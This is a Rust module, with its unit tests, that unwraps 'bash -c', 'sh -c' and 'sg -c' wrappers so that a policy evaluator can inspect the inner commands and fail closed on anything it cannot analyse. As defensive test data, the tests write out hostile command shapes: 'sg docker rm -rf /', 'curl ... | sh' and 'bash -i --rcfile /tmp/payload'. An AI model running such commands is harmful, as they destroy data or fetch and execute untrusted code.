//! Shell-C wrapper unwrapping: re-parses the string arg of bash -c, sh -c,
//! sg <group> -c, etc. when the arg's ArgMeta indicates it's safe.
//!
//! Entry points:
//! - unwrap_shell_c(cmd) — main mechanism; returns Some(Statement) for
//!   successful re-parse, Some(Opaque) for fail-closed, None for pass-through.
//! - is_covered_shell_c_wrapper(leaf) — predicate used by the evaluator to
//!   decide whether an outer shell-c wrapper leaf is safe at the leaf level
//!   because its inner command is being separately evaluated.

use super::{parse, ArgMeta, SimpleCommand, Statement};

struct ShellCDef {
    /// Basename match, e.g. "bash", "sh", "sg".
    name: &'static str,
    /// Positional args consumed before `-c`.
    /// 0 for bash/sh/zsh/dash/ash/ksh. 1 for sg (the groupname).
    pre_c_positional: usize,
    /// Flags that precede `-c` and take no value (e.g. bash's `--norc`, `-l`, `-i`).
    bool_flags: &'static [&'static str],
    /// Flags that precede `-c` and take a following value (e.g. bash's `-O <name>`).
    value_flags: &'static [&'static str],
}

static SHELL_C_WRAPPERS: &[ShellCDef] = &[
    ShellCDef {
        name: "bash",
        pre_c_positional: 0,
        bool_flags: &[
            "--norc",
            "--noprofile",
            "-l",
            "--login",
            "-i",
            "-x",
            "-e",
            "-v",
            "--posix",
            "--version",
            "--help",
        ],
        value_flags: &["-O", "+O", "--rcfile", "--init-file", "-o"],
    },
    ShellCDef {
        name: "sh",
        pre_c_positional: 0,
        bool_flags: &["-e", "-x", "-i", "-v", "--version", "--help"],
        value_flags: &[],
    },
    ShellCDef {
        name: "zsh",
        pre_c_positional: 0,
        bool_flags: &[
            "-l",
            "--login",
            "-i",
            "-x",
            "-e",
            "-v",
            "--rcs",
            "--norcs",
            "--no-rcs",
            "--globalrcs",
            "--no-globalrcs",
            "--version",
            "--help",
        ],
        value_flags: &[],
    },
    ShellCDef {
        name: "dash",
        pre_c_positional: 0,
        bool_flags: &["-e", "-x", "-i", "-v", "--version", "--help"],
        value_flags: &[],
    },
    ShellCDef {
        name: "ash",
        pre_c_positional: 0,
        bool_flags: &["-e", "-x", "-i", "-v", "--help"],
        value_flags: &[],
    },
    ShellCDef {
        name: "ksh",
        pre_c_positional: 0,
        bool_flags: &["-l", "-i", "-x", "-e", "-v", "--version", "--help"],
        value_flags: &[],
    },
    ShellCDef {
        name: "sg",
        pre_c_positional: 1, // groupname comes first
        bool_flags: &["--version", "--help", "-V", "-h"],
        value_flags: &[],
    },
];

fn wrapper_basename(name: &str) -> &str {
    name.rsplit('/').next().unwrap_or(name)
}

fn find_shell_c_def(name: &str) -> Option<&'static ShellCDef> {
    let basename = wrapper_basename(name);
    SHELL_C_WRAPPERS.iter().find(|w| w.name == basename)
}

/// If `cmd` is a shell-c wrapper and its `-c` string arg is safely
/// re-parseable, parse it and return the resulting Statement. See the
/// module docs and the design spec (docs/plans/2026-04-19-shell-c-wrappers-design.md)
/// for the full decision tree.
pub(crate) fn unwrap_shell_c(cmd: &SimpleCommand) -> Option<Statement> {
    let cmd_name = cmd.name.as_deref()?;
    let def = find_shell_c_def(cmd_name)?;

    let argv = &cmd.argv;
    let mut i = def.pre_c_positional;

    // Phase 1: consume bool_flags and value_flags that precede -c.
    while i < argv.len() {
        let token = argv[i].text.as_str();

        // Exact bool_flag match
        if def.bool_flags.contains(&token) {
            i += 1;
            continue;
        }

        // Exact value_flag match: consume flag + next token as value
        if def.value_flags.contains(&token) {
            i += 2;
            continue;
        }

        // value_flag=value form (e.g. --rcfile=foo)
        if def
            .value_flags
            .iter()
            .any(|f| token.starts_with(f) && token.as_bytes().get(f.len()) == Some(&b'='))
        {
            i += 1;
            continue;
        }

        // Not a flag — stop flag processing.
        break;
    }

    // Phase 2: decide based on what's at argv[i].
    if i >= argv.len() {
        // argv exhausted after flag consumption → pass-through
        // (bash alone, bash --version, sg docker, sg docker --version, etc.)
        return None;
    }

    let next = argv[i].text.as_str();

    if next == "-c" {
        // Phase 3: ArgMeta gate on the string argument.
        let Some(c_arg) = argv.get(i + 1) else {
            return Some(Statement::Opaque(
                "shell-c -c flag with no string".to_string(),
            ));
        };

        match c_arg.meta {
            ArgMeta::RawString | ArgMeta::SafeString => {
                // Safe to re-parse.
                match parse(&c_arg.text) {
                    Ok(Statement::Opaque(_)) => {
                        Some(Statement::Opaque("shell-c inner parse opaque".to_string()))
                    }
                    Ok(stmt) => Some(stmt),
                    Err(err) => Some(Statement::Opaque(format!(
                        "shell-c inner parse setup failed: {err}"
                    ))),
                }
            }
            ArgMeta::UnsafeString => Some(Statement::Opaque(
                "shell-c string arg not safely re-parseable: UnsafeString".to_string(),
            )),
            ArgMeta::PlainWord => Some(Statement::Opaque(
                "shell-c string arg not safely re-parseable: PlainWord".to_string(),
            )),
        }
    } else {
        // Non-`-c` positional argument: a script path, bareword command, etc.
        // Cannot statically analyze. Fail closed. SECURITY-CRITICAL — this is
        // the guard against `sg docker rm -rf /` silently allowing.
        Some(Statement::Opaque(
            "shell-c wrapper with non-c positional argument; cannot analyze".to_string(),
        ))
    }
}

/// Returns true if `leaf` is a SimpleCommand that is itself a shell-c wrapper
/// AND `unwrap_shell_c` produces a non-Opaque inner Statement for it. Used by
/// the policy evaluator to decide whether the outer wrapper leaf should be
/// treated as covered (because the inner command is separately evaluated).
pub(crate) fn is_covered_shell_c_wrapper(leaf: &Statement) -> bool {
    match leaf {
        Statement::SimpleCommand(cmd) => match unwrap_shell_c(cmd) {
            None | Some(Statement::Opaque(_)) => false,
            Some(_) => true,
        },
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::{Arg, ArgMeta, SimpleCommand, Statement};

    fn mk_cmd(name: &str, argv: Vec<Arg>) -> SimpleCommand {
        SimpleCommand {
            name: Some(name.to_string()),
            argv,
            redirects: vec![],
            assignments: vec![],
            embedded_substitutions: vec![],
        }
    }

    fn arg(text: &str, meta: ArgMeta) -> Arg {
        Arg {
            text: text.to_string(),
            meta,
        }
    }

    // ── Basename recognition (7 tests) ──────────────────────────
    #[test]
    fn basename_bash_recognized() {
        assert!(find_shell_c_def("bash").is_some());
    }
    #[test]
    fn basename_sh_recognized() {
        assert!(find_shell_c_def("sh").is_some());
    }
    #[test]
    fn basename_zsh_recognized() {
        assert!(find_shell_c_def("zsh").is_some());
    }
    #[test]
    fn basename_dash_recognized() {
        assert!(find_shell_c_def("dash").is_some());
    }
    #[test]
    fn basename_ash_recognized() {
        assert!(find_shell_c_def("ash").is_some());
    }
    #[test]
    fn basename_ksh_recognized() {
        assert!(find_shell_c_def("ksh").is_some());
    }
    #[test]
    fn basename_sg_recognized() {
        assert!(find_shell_c_def("sg").is_some());
    }

    #[test]
    fn basename_absolute_path() {
        assert!(find_shell_c_def("/usr/bin/bash").is_some());
    }
    #[test]
    fn basename_relative_path() {
        assert!(find_shell_c_def("./sh").is_some());
    }

    #[test]
    fn non_wrapper_cat() {
        assert!(find_shell_c_def("cat").is_none());
    }
    #[test]
    fn non_wrapper_timeout() {
        assert!(find_shell_c_def("timeout").is_none());
    }
    #[test]
    fn non_wrapper_python() {
        assert!(find_shell_c_def("python").is_none());
    }

    // ── pre_c_positional (2 tests) ──────────────────────────────
    #[test]
    fn sg_skips_groupname_then_finds_c() {
        let cmd = mk_cmd(
            "sg",
            vec![
                arg("docker", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        // Safe re-parse; returns Some(SimpleCommand(docker ps))
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    #[test]
    fn bash_does_not_skip_argv0() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    // ── Flag consumption (5 tests) ──────────────────────────────
    #[test]
    fn bash_norc_noprofile_consumed() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("--norc", ArgMeta::PlainWord),
                arg("--noprofile", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    #[test]
    fn bash_login_flag_consumed() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-l", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    #[test]
    fn bash_posix_flag_consumed() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("--posix", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    #[test]
    #[allow(non_snake_case)]
    fn bash_dash_O_with_value_consumed() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-O", ArgMeta::PlainWord),
                arg("extglob", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    #[test]
    fn bash_dash_o_with_value_consumed() {
        // -o is a value_flag per Codex-found missing-flag fix.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-o", ArgMeta::PlainWord),
                arg("posix", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    #[test]
    fn bash_rcfile_equals_form_consumed() {
        // `bash --rcfile=/tmp/my -c 'docker ps'` — the --rcfile=value form
        // is a single argv token consumed by the =-form branch, not the
        // exact-match branch which consumes two tokens.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("--rcfile=/tmp/my", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    // ── Missing-c pass-through (4 tests) — I1 regression guard ───
    #[test]
    fn bash_version_returns_none() {
        // --version is in bool_flags; consumed → argv empty → None.
        let cmd = mk_cmd("bash", vec![arg("--version", ArgMeta::PlainWord)]);
        assert!(unwrap_shell_c(&cmd).is_none());
    }

    #[test]
    fn bash_help_returns_none() {
        let cmd = mk_cmd("bash", vec![arg("--help", ArgMeta::PlainWord)]);
        assert!(unwrap_shell_c(&cmd).is_none());
    }

    #[test]
    fn sg_groupname_only_returns_none() {
        let cmd = mk_cmd("sg", vec![arg("docker", ArgMeta::PlainWord)]);
        assert!(unwrap_shell_c(&cmd).is_none());
    }

    #[test]
    fn sg_docker_version_returns_none() {
        // sg consumes docker (pre_c skip), then --version (bool_flag).
        let cmd = mk_cmd(
            "sg",
            vec![
                arg("docker", ArgMeta::PlainWord),
                arg("--version", ArgMeta::PlainWord),
            ],
        );
        assert!(unwrap_shell_c(&cmd).is_none());
    }

    // ── Non-c positional → Opaque (5 tests) — SECURITY CRITICAL ──
    #[test]
    fn bash_script_path_returns_opaque() {
        let cmd = mk_cmd("bash", vec![arg("script.sh", ArgMeta::PlainWord)]);
        match unwrap_shell_c(&cmd) {
            Some(Statement::Opaque(reason)) => {
                assert!(reason.contains("non-c positional"), "{reason}");
            }
            other => panic!("expected Opaque, got {:?}", other),
        }
    }

    #[test]
    fn bash_home_script_path_returns_opaque() {
        let cmd = mk_cmd("bash", vec![arg("~/foo.sh", ArgMeta::PlainWord)]);
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::Opaque(_))));
    }

    #[test]
    fn sg_docker_bareword_command_returns_opaque() {
        // `sg docker rm` — skip docker, rm is not -c and not a flag.
        let cmd = mk_cmd(
            "sg",
            vec![
                arg("docker", ArgMeta::PlainWord),
                arg("rm", ArgMeta::PlainWord),
            ],
        );
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::Opaque(_))));
    }

    #[test]
    fn sg_docker_destructive_positional_returns_opaque() {
        // CRITICAL: the exact attack shape Codex flagged — must not return None.
        let cmd = mk_cmd(
            "sg",
            vec![
                arg("docker", ArgMeta::PlainWord),
                arg("rm", ArgMeta::PlainWord),
                arg("-rf", ArgMeta::PlainWord),
                arg("/", ArgMeta::PlainWord),
            ],
        );
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::Opaque(_))));
    }

    #[test]
    fn bash_x_then_script_returns_opaque() {
        // -x consumed as bool_flag; script.sh remains as non-c positional.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-x", ArgMeta::PlainWord),
                arg("script.sh", ArgMeta::PlainWord),
            ],
        );
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::Opaque(_))));
    }

    // ── -c malformed (2 tests) ──────────────────────────────────
    #[test]
    fn bash_c_with_no_string_arg_returns_opaque() {
        let cmd = mk_cmd("bash", vec![arg("-c", ArgMeta::PlainWord)]);
        match unwrap_shell_c(&cmd) {
            Some(Statement::Opaque(reason)) => {
                assert!(reason.contains("no string"), "{reason}");
            }
            other => panic!("expected Opaque, got {:?}", other),
        }
    }

    #[test]
    fn sg_docker_c_with_no_string_arg_returns_opaque() {
        let cmd = mk_cmd(
            "sg",
            vec![
                arg("docker", ArgMeta::PlainWord),
                arg("-c", ArgMeta::PlainWord),
            ],
        );
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::Opaque(_))));
    }

    // ── ArgMeta gate (5 tests) ──────────────────────────────────
    #[test]
    fn rawstring_re_parses_to_simple_command() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::RawString),
            ],
        );
        match unwrap_shell_c(&cmd) {
            Some(Statement::SimpleCommand(sc)) => {
                assert_eq!(sc.name.as_deref(), Some("docker"));
            }
            other => panic!("expected SimpleCommand, got {:?}", other),
        }
    }

    #[test]
    fn safestring_re_parses_to_simple_command() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::SafeString),
            ],
        );
        assert!(matches!(
            unwrap_shell_c(&cmd),
            Some(Statement::SimpleCommand(_))
        ));
    }

    #[test]
    fn unsafestring_returns_opaque() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("rm $TARGET", ArgMeta::UnsafeString),
            ],
        );
        match unwrap_shell_c(&cmd) {
            Some(Statement::Opaque(reason)) => {
                assert!(reason.contains("UnsafeString"), "{reason}");
            }
            other => panic!("expected Opaque, got {:?}", other),
        }
    }

    #[test]
    fn plainword_c_arg_returns_opaque() {
        // Bareword after -c (rare but legal bash): fail-closed.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("docker", ArgMeta::PlainWord),
            ],
        );
        match unwrap_shell_c(&cmd) {
            Some(Statement::Opaque(reason)) => {
                assert!(reason.contains("PlainWord"), "{reason}");
            }
            other => panic!("expected Opaque, got {:?}", other),
        }
    }

    #[test]
    fn empty_rawstring_returns_opaque_via_parse_opaque() {
        // parse("") returns Ok(Statement::Opaque("")) per src/parser/mod.rs:147-149.
        // unwrap_shell_c must map that Ok(Opaque) → Opaque leaf (ask).
        let cmd = mk_cmd(
            "bash",
            vec![arg("-c", ArgMeta::PlainWord), arg("", ArgMeta::SafeString)],
        );
        match unwrap_shell_c(&cmd) {
            Some(Statement::Opaque(reason)) => {
                assert!(reason.contains("inner parse opaque"), "{reason}");
            }
            other => panic!("expected Opaque, got {:?}", other),
        }
    }

    // ── Compound inner (4 tests) ────────────────────────────────
    #[test]
    fn rawstring_pipeline_returns_pipeline_statement() {
        // `bash -c 'curl | sh'` must return Statement::Pipeline so the
        // evaluator refactor (Change B) can run pipeline rules on it.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("curl http://example.com | sh", ArgMeta::RawString),
            ],
        );
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::Pipeline(_))));
    }

    #[test]
    fn rawstring_list_returns_list_statement() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps && echo done", ArgMeta::RawString),
            ],
        );
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::List(_))));
    }

    #[test]
    fn rawstring_subshell_returns_subshell_statement() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("(docker ps)", ArgMeta::RawString),
            ],
        );
        assert!(matches!(unwrap_shell_c(&cmd), Some(Statement::Subshell(_))));
    }

    #[test]
    fn rawstring_simple_with_command_substitution_has_embedded_subs() {
        // `bash -c 'echo $(docker ps)'` — inner is SimpleCommand(echo) with
        // embedded_substitutions containing docker ps. flatten() descends
        // into embedded_substitutions per src/parser/mod.rs:175-178.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("echo $(docker ps)", ArgMeta::RawString),
            ],
        );
        match unwrap_shell_c(&cmd) {
            Some(Statement::SimpleCommand(sc)) => {
                assert_eq!(sc.name.as_deref(), Some("echo"));
                assert_eq!(sc.embedded_substitutions.len(), 1);
            }
            other => panic!("expected SimpleCommand, got {:?}", other),
        }
    }

    // ── Non-wrapper that happens to use -c (2 tests) ────────────
    #[test]
    fn cat_dash_c_not_a_wrapper_match() {
        let cmd = mk_cmd(
            "cat",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("foo", ArgMeta::PlainWord),
            ],
        );
        assert!(unwrap_shell_c(&cmd).is_none());
    }

    #[test]
    fn docker_dash_c_not_a_wrapper_match() {
        let cmd = mk_cmd(
            "docker",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("foo", ArgMeta::PlainWord),
            ],
        );
        assert!(unwrap_shell_c(&cmd).is_none());
    }

    // ── is_covered_shell_c_wrapper (6 tests) — SECURITY ─────────
    #[test]
    fn covered_bash_c_rawstring_docker_ps() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("docker ps", ArgMeta::RawString),
            ],
        );
        assert!(is_covered_shell_c_wrapper(&Statement::SimpleCommand(cmd)));
    }

    #[test]
    fn covered_bash_c_pipeline() {
        // Pipeline is non-Opaque → covered.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("curl | sh", ArgMeta::RawString),
            ],
        );
        assert!(is_covered_shell_c_wrapper(&Statement::SimpleCommand(cmd)));
    }

    #[test]
    fn not_covered_bash_c_unsafestring() {
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-c", ArgMeta::PlainWord),
                arg("rm $VAR", ArgMeta::UnsafeString),
            ],
        );
        assert!(!is_covered_shell_c_wrapper(&Statement::SimpleCommand(cmd)));
    }

    #[test]
    fn not_covered_bash_version_diagnostic() {
        // unwrap returns None → not covered HERE.
        // (Version-check coverage is handled by the existing
        //  is_allowlisted → is_version_check path at
        //  src/policy/allowlist.rs:22; NOT this predicate.)
        let cmd = mk_cmd("bash", vec![arg("--version", ArgMeta::PlainWord)]);
        assert!(!is_covered_shell_c_wrapper(&Statement::SimpleCommand(cmd)));
    }

    #[test]
    fn not_covered_bash_interactive() {
        // CRITICAL: `bash -i` / `bash -i --rcfile /tmp/payload` attack shapes
        // must not be covered. unwrap returns None for both.
        let cmd = mk_cmd(
            "bash",
            vec![
                arg("-i", ArgMeta::PlainWord),
                arg("--rcfile", ArgMeta::PlainWord),
                arg("/tmp/payload", ArgMeta::PlainWord),
            ],
        );
        assert!(!is_covered_shell_c_wrapper(&Statement::SimpleCommand(cmd)));
    }

    #[test]
    fn not_covered_sg_docker_non_c_positional() {
        // CRITICAL: `sg docker rm -rf /` attack shape. unwrap returns
        // Some(Opaque) → not covered.
        let cmd = mk_cmd(
            "sg",
            vec![
                arg("docker", ArgMeta::PlainWord),
                arg("rm", ArgMeta::PlainWord),
                arg("-rf", ArgMeta::PlainWord),
                arg("/", ArgMeta::PlainWord),
            ],
        );
        assert!(!is_covered_shell_c_wrapper(&Statement::SimpleCommand(cmd)));
    }
}
